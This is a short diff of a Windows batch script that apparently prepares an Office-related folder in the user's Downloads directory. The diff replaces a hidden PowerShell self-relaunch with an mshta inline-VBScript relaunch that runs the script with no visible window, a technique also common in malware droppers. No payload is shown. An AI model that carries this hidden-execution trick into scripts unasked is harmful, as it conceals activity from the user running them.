@@ -1,5 +1,5 @@
 @echo off
-if "%~1"=="" powershell "Start '%~f0' 1 -W Hidden"&exit
+if "%~1"=="" mshta vbscript:CreateObject("WScript.Shell").Run "%~f0 1" , 0, False
 cd/d "%userprofile%\Downloads"
 set tmp_fold=office-%random%
 md %tmp_fold%
